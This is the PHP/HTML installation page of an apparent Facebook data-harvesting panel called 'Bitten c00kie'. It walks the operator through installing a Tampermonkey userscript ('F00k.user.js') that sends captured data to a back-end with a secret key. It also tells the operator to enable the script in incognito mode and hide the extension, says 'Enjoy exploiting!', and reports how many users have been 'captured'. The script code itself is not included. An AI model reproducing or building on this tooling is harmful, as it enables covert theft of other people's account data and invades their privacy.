<?php

session_start();
require('Config.php');
if(!$_SESSION['auth']){
  echo "You must auth to see this page, retard.";
  exit;
}



?>



<!DOCTYPE html>
  <html>
    <head>
      <title>FB Reader</title>
       <link rel="stylesheet" type="text/css" href="s.css">
       <meta charset="UTF-8">
       <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" crossorigin="anonymous">
       <meta name="viewport" content="width=device-width, initial-scale=1">
      <!--===============================================================================================-->
       <link rel="icon" type="image/png" href="assets/images/icons/favicon.ico"/>
      <!--===============================================================================================-->
       <link rel="stylesheet" type="text/css" href="assets/vendor/bootstrap/css/bootstrap.min.css">
      <!--===============================================================================================-->
       <link rel="stylesheet" type="text/css" href="assets/fonts/font-awesome-4.7.0/css/font-awesome.min.css">
      <!--===============================================================================================-->
       <link rel="stylesheet" type="text/css" href="assets/fonts/iconic/css/material-design-iconic-font.min.css">
      <!--===============================================================================================-->
       <link rel="stylesheet" type="text/css" href="assets/vendor/animate/animate.css">
      <!--===============================================================================================-->
       <link rel="stylesheet" type="text/css" href="assets/vendor/css-hamburgers/hamburgers.min.css">
      <!--===============================================================================================-->
       <link rel="stylesheet" type="text/css" href="assets/vendor/animsition/css/animsition.min.css">
      <!--===============================================================================================-->
       <link rel="stylesheet" type="text/css" href="assets/vendor/select2/select2.min.css">
      <!--===============================================================================================-->
       <link rel="stylesheet" type="text/css" href="assets/vendor/daterangepicker/daterangepicker.css">
      <!--===============================================================================================-->
       <link rel="stylesheet" type="text/css" href="assets/css/util.css">
       <link rel="stylesheet" type="text/css" href="assets/css/main.css">
      <!--===============================================================================================-->
       <script>
        window.onload = function(){
          var c = document.getElementById("c");
   var ctx = c.getContext("2d");

   //making the canvas full screen
   c.height = window.innerHeight;
   c.width = window.innerWidth;

   //chinese characters - taken from the unicode charset
   var chinese = "田由甲申甴电甶男甸甹町画甼甽甾甿畀畁畂畃畄畅畆畇畈畉畊畋界畍畎畏畐畑";
   //converting the string into an array of single characters
   chinese = chinese.split("");

   var font_size = 10;
   var columns = c.width/font_size; //number of columns for the rain
   //an array of drops - one per column
   var drops = [];
   //x below is the x coordinate
   //1 = y co-ordinate of the drop(same for every drop initially)
   for(var x = 0; x < columns; x++)
    drops[x] = 1;

    //Crazy title

    function titleRand(){
      let chars = [
        chinese[Math.floor(Math.random()*chinese.length)],
        chinese[Math.floor(Math.random()*chinese.length)],
        chinese[Math.floor(Math.random()*chinese.length)],
        chinese[Math.floor(Math.random()*chinese.length)],
        chinese[Math.floor(Math.random()*chinese.length)],
        chinese[Math.floor(Math.random()*chinese.length)]
      ];
      window.document.title = chars.join('');
    }

   //drawing the characters
   function draw()
   {
     titleRand();
    //Black BG for the canvas
    //translucent BG to show trail
    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
    ctx.fillRect(0, 0, c.width, c.height);

    ctx.fillStyle = "#ff0230"; //green text
    ctx.font = font_size + "px courier";
    //looping over drops
    for(var i = 0; i < drops.length; i++)
    {
      //a random chinese character to print
      var text = chinese[Math.floor(Math.random()*chinese.length)];
      //x = i*font_size, y = value of drops[i]*font_size
      ctx.fillText(text, i*font_size, drops[i]*font_size);

      //sending the drop back to the top randomly after it has crossed the screen
      //adding a randomness to the reset to make the drops scattered on the Y axis
      if(drops[i]*font_size > c.height && Math.random() > 0.975)
        drops[i] = 0;

      //incrementing Y coordinate
      drops[i]++;
    }
   }
   setInterval(draw, 27);
        }
       </script>
    </head>
    <body>
      <div id="navbar">

        <div id="navbar-minilogo" onclick="location.href=('index.php')">
          <i class="fas fa-cookie-bite"></i>
          <span id="navbar-mininame">Bitten c00kie</span>
        </div>

        <div id="navbar-logout">
          <span id="user-info" onclick="location.href=('index.php')">
            <img src="<?php echo getUserPicture($_SESSION['username']); ?>" width="40" height="40"> @<?php echo $_SESSION['username']; ?> -
          </span>
          <a href="logout.php">Log out</a>
        </div>
      </div>
      <canvas id="c"></canvas>
        <div id="content">

          <div id="installation-guide">

            <div id="installation-step">
              <h4>1.- Installing the script emulator (Tampermonkey)</h4>
              To run this script continuously on any browser, you need an emulator. For Chrome and Firefox you can use <a href="https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo?hl=es" target="_blank">Tampermonkey</a>
              <br>
              <center><img src="https://raw.githubusercontent.com/wiki/OpenUserJS/OpenUserJS.org/images/tampermonkey1.png" width="800"></center>
                <br>
            </div>

            <div id="installation-step">
              <h4>2.- Configuring Tampermonkey</h4>
              There are two things you need to do first to give this trick a bigger context and also... Keep it secret, shh!!
              <br>
              Go to your extensions configuration and make sure to enable the "Incognito mode", so the script can run even in Incognito.
              <center><img src="https://i.kinja-img.com/gawker-media/image/upload/s--E6JglIS_--/c_scale,f_auto,fl_progressive,q_80,w_800/uv3kwgwvn0xmgs9ccvv6.png" width="800"></center>
                <br>
              And after doing this, drag and drop Tampermonkey to the side menu to hide your extension!
              <center><img src="https://www.howtogeek.com/wp-content/uploads/2016/06/03_button_in_chrome_menu.png" width="800"></center>
            </div>

            <div id="installation-step">
              <h4>3.- Installing the script</h4>
              The script must have your secret key to receive correctly your data, this means that if you modify and install the script without the key
              or without the back-end PHP hack running by your own, you won't be able to save the data. <br>
              <center><a href="install/F00k.user.js">Install my Tampermonkey script naw!</a></center>
            </div>

            <div id="installation-step">
              <h4>4.- Enjoy exploiting!</h4>
              Currently, I'm still working on the suggestions tool, just wait for it... <br>
              You can view your results from the <a href="index.php">control panel</a>.
            </div>

          </div>

        </div>
<div id="snackbar"></div>
        <!--===============================================================================================-->
          <script src="assets/vendor/jquery/jquery-3.2.1.min.js"></script>
        <!--===============================================================================================-->
          <script src="assets/vendor/animsition/js/animsition.min.js"></script>
        <!--===============================================================================================-->
          <script src="assets/vendor/bootstrap/js/popper.js"></script>
          <script src="assets/vendor/bootstrap/js/bootstrap.min.js"></script>
        <!--===============================================================================================-->
          <script src="assets/js/main.js"></script>
          <script>setTimeout(function(){snack('<?php echo "You\'ve captured " . $count . " users, nice."; ?>');},800);</script>
    </body>
  </html>
